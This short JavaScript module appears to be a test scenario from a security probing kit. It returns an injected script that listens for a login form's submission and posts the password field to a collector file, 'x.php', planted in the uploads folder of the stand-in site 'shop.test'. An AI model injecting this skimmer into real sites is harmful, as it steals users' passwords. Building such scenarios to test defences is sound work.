// Attack: the password posted to a collector planted on the site's own origin.
import { scenario } from './probe-kit.js';

export const respond = scenario((ctx) => `document.getElementById('login').addEventListener('submit', function () {
  fetch('${ctx.origin('shop.test')}/wp-content/uploads/x.php', { method: 'POST', body: 'd=' + encodeURIComponent(document.getElementById('password').value) });
});`);
